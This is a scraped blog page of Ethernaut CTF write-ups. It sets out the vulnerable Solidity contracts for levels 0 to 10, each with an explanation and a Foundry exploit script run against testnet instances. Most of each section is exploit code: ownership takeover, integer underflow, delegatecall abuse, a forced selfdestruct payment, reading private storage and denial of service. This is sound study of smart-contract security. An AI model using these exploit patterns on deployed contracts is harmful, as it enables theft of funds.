</span><span class="token" style="color:#6a9955">            [020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check
</span><span class="token" style="color:#6a9955">            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier
</span><span class="token" style="color:#6a9955">            [060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data
</span><span class="token" style="color:#6a9955">            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge
</span><span class="token" style="color:#6a9955">
</span><span class="token" style="color:#6a9955">         */</span><span>
</span>
<span>         console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;Switch is :&quot;</span><span class="token" style="color:#d4d4d4">,</span><span> instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">switchOn</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>         vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>To run the script:</strong></p>
<pre><code>$ source .env
$ forge script script/Level29Solution.s.sol:Level29Sol --rpc-url $RPC_URL --broadcast
</code></pre></div></article></main></div><!--$--><!--/$--><canvas class="fixed inset-0 w-full h-full pointer-events-none z-50"></canvas><!--$!--><template data-dgst="BAILOUT_TO_CLIENT_SIDE_RENDERING"></template><!--/$--><script src="/_next/static/chunks/4995e6db2daa090b.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[30783,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"ThemeProvider\"]\n3:I[6489,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n4:I[72080,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n5:I[24390,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"default\"]\n6:I[86647,[\"/_next/static/chunks/13f8b9b460cab25b.js\"],\"Analytics\"]\n8:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"OutletBoundary\"]\n9:\"$Sreact.suspense\"\nb:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"ViewportBoundary\"]\nd:I[45429,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"MetadataBoundary\"]\nf:I[21611,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"default\"]\n:HL[\"/_next/static/chunks/8a80e7184ad3a13f.css\",\"style\"]\n:HL[\"/_next/static/chunks/3aecbadcd45aebe7.css\",\"style\"]\n:HL[\"/_next/static/media/797e433ab948586e-s.p.dbea232f.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/caa3a2e1cccd8315-s.p.853070df.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"xOmyQrz477VMR99oMhEMM\",\"c\":[\"\",\"blogs\",\"ethernaut-ctf-challenges-writeups\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"blogs\",{\"children\":[[\"slug\",\"ethernaut-ctf-challenges-writeups\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/8a80e7184ad3a13f.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"link\",\"1\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/3aecbadcd45aebe7.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/13f8b9b460cab25b.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"lang\":\"en\",\"suppressHydrationWarning\":true,\"children\":[\"$\",\"body\",null,{\"className\":\"font-sans antialiased\",\"children\":[[\"$\",\"$L2\",null,{\"attribute\":\"class\",\"defaultTheme\":\"dark\",\"enableSystem\":true,\"disableTransitionOnChange\":true,\"children\":[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[[\"$\",\"title\",null,{\"children\":\"404: This page could not be found.\"}],[\"$\",\"div\",null,{\"style\":{\"fontFamily\":\"system-ui,\\\"Segoe UI\\\",Roboto,Helvetica,Arial,sans-serif,\\\"Apple Color Emoji\\\",\\\"Segoe UI Emoji\\\"\",\"height\":\"100vh\",\"textAlign\":\"center\",\"display\":\"flex\",\"flexDirection\":\"column\",\"alignItems\":\"center\",\"justifyContent\":\"center\"},\"children\":[\"$\",\"div\",null,{\"children\":[[\"$\",\"style\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}\"}}],[\"$\",\"h1\",null,{\"className\":\"next-error-h1\",\"style\":{\"display\":\"inline-block\",\"margin\":\"0 20px 0 0\",\"padding\":\"0 23px 0 0\",\"fontSize\":24,\"fontWeight\":500,\"verticalAlign\":\"top\",\"lineHeight\":\"49px\"},\"children\":404}],[\"$\",\"div\",null,{\"style\":{\"display\":\"inline-block\"},\"children\":[\"$\",\"h2\",null,{\"style\":{\"fontSize\":14,\"fontWeight\":400,\"lineHeight\":\"49px\",\"margin\":0},\"children\":\"This page could not be found.\"}]}]]}]}]],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}],[\"$\",\"$L5\",null,{}],[\"$\",\"$L6\",null,{}]]}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"$L3\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L4\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L7\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/cc162e5663281663.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/b05a5109468bf8e7.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/63bdf154c4daac0e.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L8\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@a\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$Lb\",null,{\"children\":\"$@c\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Ld\",null,{\"children\":[\"$\",\"$9\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@e\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$f\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"10:I[68275,[\"/_next/static/chunks/13f8b9b460cab25b.js\",\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/b05a5109468bf8e7.js\",\"/_next/static/chunks/63bdf154c4daac0e.js\"],\"Header\"]\n11:I[2879,[\"/_next/static/chunks/13f8b9b460cab25b.js\",\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/b05a5109468bf8e7.js\",\"/_next/static/chunks/63bdf154c4daac0e.js\"],\"BlogContent\"]\n12:T1b77c,"])</script><script>self.__next_f.push([1,"\n\n## Setup\n\nInstall the foundry by using: [https://book.getfoundry.sh/getting-started/installation](https://book.getfoundry.sh/getting-started/installation)\n\nSolved challenges repository: [https://github.com/BhaskarPeruri/OZ_Ethernaut](https://github.com/BhaskarPeruri/OZ_Ethernaut)\n\nThe challenge contracts are in `/src`.\n\nSolution scripts are in  `/script`.\n\nSetup the .env file in the repository and fill the following required fields.\n\n```\nRPC_URL=\nMY_ADDRESS=\nPRIVATE_KEY=\n```\n\n\n## Hello Ethernaut\n\n**Level0.sol**\n\nWe have to deploy the instance and call the info() method on it and follow the given instructions to solve this challenge.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Instance {\n\n  string public password;\n  uint8 public infoNum = 42;\n  string public theMethodName = 'The method name is method7123949.';\n  bool private cleared = false;\n\n  // constructor\n  constructor(string memory _password) public {\n    password = _password;\n  }\n\n  function info() public pure returns (string memory) {\n    return 'You will find what you need in info1().';\n  }\n\n  function info1() public pure returns (string memory) {\n    return 'Try info2(), but with \"hello\" as a parameter.';\n  }\n\n  function info2(string memory param) public pure returns (string memory) {\n    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {\n      return 'The property infoNum holds the number of the next info method to call.';\n    }\n    return 'Wrong parameter.';\n  }\n\n  function info42() public pure returns (string memory) {\n    return 'theMethodName is the name of the next method.';\n  }\n\n  function method7123949() public pure returns (string memory) {\n    return 'If you know the password, submit it to authenticate().';\n  }\n\n  function authenticate(string memory passkey) public {\n    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {\n      cleared = true;\n    }\n  }\n\n  function getCleared() public view returns (bool) {\n    return cleared;\n  }\n}\n\n```\n\n**Level0Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level0.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level0Sol is Script{\n\n    Instance public level0 = Instance(0x45788399AFea13881872eA360A071f86E3D946fb);\n    function run() external{\n\n        string memory password = level0.password();\n        console.log(\"Password:\",password);\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        level0.authenticate(password);\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level0Solution.s.sol:Level0Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Fallback\n\n**Level1.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objectives --claim ownership of  the token and drain it's eth\ncontract Fallback {\n\n  mapping(address =\u003e uint) public contributions;\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n  function contribute() public payable {\n    require(msg.value \u003c 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] \u003e contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    payable(owner).transfer(address(this).balance);\n  }\n\n  receive() external payable {\n    require(msg.value \u003e 0 \u0026\u0026 contributions[msg.sender] \u003e 0);\n    owner = msg.sender;//red flag\n  }\n}\n\n```\n\n**Goal:**\n\nWe need to become the owner of the contract and drain all the ether from it.\n\n**Explanation:**\n\n1. To set the owner we need to pass the require check in `receive()`.\n2. To pass the check we have to send some ether with the transaction.\n3. So, initially we will send contributions and then send some ether to the contract to invoke the `receive()` method.\n4. Now, we can call `withdraw()` function to drain the contract.\n\n**Level1Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level1.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level1Sol is Script{\n\n    Fallback public level1 = Fallback(payable(0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E));//pass the contract address deployed on the sepolia testnet\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        level1.contribute{value: 1 wei}();\n        address(level1).call{value: 1 wei}(\"\");\n        console.log(\"New owner:\",level1.owner());\n        console.log(\"My address:\",vm.envAddress(\"MY_ADDRESS\"));\n\n        //once we became the owner of the contract, we can now withdraw\n\n        level1.withdraw();\n\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level1Solution.s.sol:Level1Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Fallout\n\n**Level2.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\n//objectives-- claim ownership of the contract\n\ncontract Fallout {\n\n  using SafeMath for uint256;\n  mapping (address =\u003e uint) allocations;\n  address payable public owner;\n\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] \u003e 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n```\n\n**Goal**: Claim the ownership of the contract\n\n**Explanation:**\n\n1. In Solidity 0.6.0, the constructor is the function with the same name as the contract.\n2. But in the given challenge, the contract name (`Fallout`) and the function name(`Fal1out`) are not the same.\n3. So, we can call this function directly.\n\n**Level2Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level2.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level2Sol is Script{\n\n    Fallout public level2 = Fallout(0xaEb939E61726c0f9d0078c3FC1C1508ABa6C26C4);\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Owner before\",level2.owner());\n        level2.Fal1out();\n        console.log(\"Owner after\",level2.owner());\n        vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level2Solution.s.sol:Level2Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Coin Flip\n\n**Level3.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n// win the game 10 times at a time\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\n**Goal:**\n\nWe have to make the `consecutiveWins` to 10. We need to guess the coin flip consecutives 10 times.\n\n**Explanation:**\n\n1. We can implement the same logic which is used to find the `side` of the coin in the `CoinFlip` contract.\n2. I wrote a player contract which will perform the `flip()` calculation and sends the value to the `CoinFlip` contract.\n3. Since the entire computaion in both contracts happens in same transaction, the `block.hash` and `block.number` remains same in both contracts.\n4. But we need to run the player script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.\n\n**Level3Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level3.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract player{\n      uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n     constructor(CoinFlip _coinflipInstance){\n            uint256 blockValue = uint256(blockhash(block.number - 1));\n            uint256 coinFlip = blockValue / FACTOR;\n            bool side = coinFlip == 1 ? true : false;\n            _coinflipInstance.flip(side);\n\n     }\n\n}\ncontract Level3Sol is Script{\n\n    CoinFlip public level3 = CoinFlip(0x4d03165ffad46794329037004988b6De42AaC4DB);//pass the contract address deployed on the sepolia testnet\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new player(level3);\n        console.log(\"consecutive wins:\",level3.consecutiveWins());\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level3Solution.s.sol:Level3Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Telephone\n\n**Level4.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n```\n\n**Goal:** Claim the ownership of the Telephone contract\n\n**Explanation:**\n\n1. If the `msg.sender` is equals to `tx.origin` which means the call was from a EOA. If its not, then the call is from a contract.\n2. To bypass that check, I have an written an intermediary contract which will call the `changeOwner()` function.\n3. Thus `msg.sender` is our intermediary contract and `tx.origin` is our EOA.\n4. Simply call the `changeOwner()` function from the intermediary contract.\n\n**Level4Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level4.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract IntermediatoryContract{\n\n    constructor(Telephone _telephoneInstance, address _newOwner){\n        _telephoneInstance.changeOwner(_newOwner);\n    }\n}\n\ncontract Level4Sol is Script{\n\n    Telephone public level4 = Telephone(0x7Ca95d4b9f0a67539f9A3586e895C67547c76190);\n\n    function run() external{\n\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n    new IntermediatoryContract(\n        level4,vm.envAddress(\"MY_ADDRESS\")\n    );\n\n    vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level4Solution.s.sol:Level4Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Token\n\n**Level5.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n//objectives :\n//1.take more than 20 tokens\ncontract Token {\n\n  mapping(address =\u003e uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value \u003e= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n```\n\n**Goal:**\n\nWe have initial token balance of 20, we need to take more than 20 tokens.\n\n**Explanation:**\n\n1. This contract uses solidity pragma `0.6.0`, in which no arithmetic overflow/underflow checks are not performed by default.\n2. In `transfer()` function the require check can be bypassed when we pass value as more than 20.\n3. 20 - 21 = -1 which results in `2**256 - 1`. Which is `\u003e= 0` and the same will happens in the update of balance at sender.\n4. `balances[msg.sender] -= _value;` will become balance[msg.sender] = 20 - 21 = 2**256 -1.\n\n**Level5Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level5.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level5Sol is Script{\n\n    Token public level5 = Token(0xf363A66580c0E202396333d08Fc53e18cbcc625F);\n\n    function run() external{\n\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n    console.log(\"total supply:\",level5.totalSupply());\n    level5.transfer(address(0),21);\n    console.log(\"MY balance:\",level5.balanceOf(vm.envAddress(\"MY_ADDRESS\")));\n    vm.stopBroadcast();\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level5Solution.s.sol:Level5Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Delegation\n\n**Level6.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n//claim ownership\n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n```\n\n**Goal:**\nClaim ownership of Delegation contract\n\n**Explanation:**\n\n1. `Delegation` contracts uses delegatecall to call the other contract `Delegate`.\n2. One thing to remember with delegatecall is that it will maintain the `msg.sender` and `msg.value` when it calls other contract.\n3. And also it updates the caller contract storage not the contract which being called.\n4. So, when we call `pwn()` on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.\n\n**Level6Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level6.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level6Sol is Script{\n\n    Delegation public level6 = Delegation(0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7);\n\n    function run()  external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Initial Owner : \", level6.owner());\n\n        address(level6).call(abi.encodeWithSignature(\"pwn()\"));\n\n        console.log(\"Final Owner : \", level6.owner());\n        vm.stopBroadcast();\n\n    }\n\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level6Solution.s.sol:Level6Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Force\n\n**Level7.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /_/   /\n    ____/ o o   /~____  =ø= /\n (______)__m_m)\n\n*/}\n```\n\n**Goal:**\n\nWe need to make the balance of the Force contract more than 0.\n\n**Explanation:**\n\n1. There is no `receive()/fallback()` function and no payable functions in the Force contract.\n2. If we send any ether to this contract it will be reverted.\n3. One thing , we can do is that deploy a contract with some ether and implement a `selfdestruct` function and pass the recepient as the `Force` contract address.\n4. Upon selfdestruct of the Attack contract, Force contract will receive ether.\n\n**Level7Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract ToBeDestructed{\n    constructor(address payable _forceAddress) payable{\n        selfdestruct(_forceAddress);\n    }\n}\n\ncontract Level7Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new ToBeDestructed{value: 1 wei}(payable(0x562488c3a3f2208737b860fF335cfBc3CD306865));\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level7Solution.s.sol:Level7Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Vault\n\n**Level8.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n```\n\n**Goal:**\n\nWe need to unlock the vault.\n\n**Explanation**:\n\n1. We can simply call the `unlock()` function with password. But the password was not publicly accessible.\n2. Declaring a variable `private` doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.\n3. We can solve this by two ways, one is using with foundry `vm.load` and another is using with blockchain explorer(Sepolia Etherscan).\n4. I used `vm.load`. in foundry.\n\n**Level8Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level8.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level8Sol is Script{\n\n     Vault public level8 = Vault(0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 password = vm.load(address(level8), bytes32(uint256(1)));\n        console.logBytes32(password);\n        level8.unlock(password);\n\n        vm.stopBroadcast();\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level8Solution.s.sol:Level8Sol --rpc-url $RPC_URL --broadcast\n```\n\n## King\n\n**Level9.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\n  address king;\n  uint public prize;\n  address public owner;\n\n  constructor() payable {\n    owner = msg.sender;\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value \u003e= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address) {\n    return king;\n  }\n}\n```\n\n**Goal:**\n\nBe the `King` and make others dont claim the `King` position again.\n\n**Explanation:**\n\n1. Initially check the `prize` amount that need to send to be the king. And send the `prize` amount to the `King` contract.\n2. When someone send the `prize` amount back to us to claim the king position, we can deny the money.\n3. So, that they wont be the king anymore.\n4. In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any `receive()/fallback()` function.\n5. This will revert others transaction when they sends prize to us, So, we will remain as the king.\n\n**Level9Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level9.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    constructor(King _kingInstance) payable {\n        address(_kingInstance).call{value:_kingInstance.prize()}(\"\");//calling the receiver function in King contract\n    }\n    //since there is no fallback or receive function in this contract ,we can successfully denied the money\n}\n\ncontract Level9Sol is Script{\n\n    King public kingInstance = King(payable(0xb6Db4938daB72C9e2DF8a19eE5846D2692872441));\n\n    function run() external {\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n    console.log(\"first King is :\",kingInstance._king());\n    console.log(\"first prize is:\",kingInstance.prize());\n\n    new Attack{value:kingInstance.prize()}(kingInstance);\n\n    console.log(\"second King is :\",kingInstance._king());\n    console.log(\"second prize is:\",kingInstance.prize());\n\n    vm.stopBroadcast();\n\n    }\n\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level9Solution.s.sol:Level9Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Reentrancy\n\n**Level10.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\ncontract Reentrance {\n\n  using SafeMath for uint256;\n  mapping(address =\u003e uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] \u003e= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n\n```\n\n**Goal:**\n\nDrain all the ether of the Reentrance contract.\n\n**Explanation**:\n\n1. The `withdraw()` function is vulnerable to `Reentrancy`, as it is updating the user balance after the external 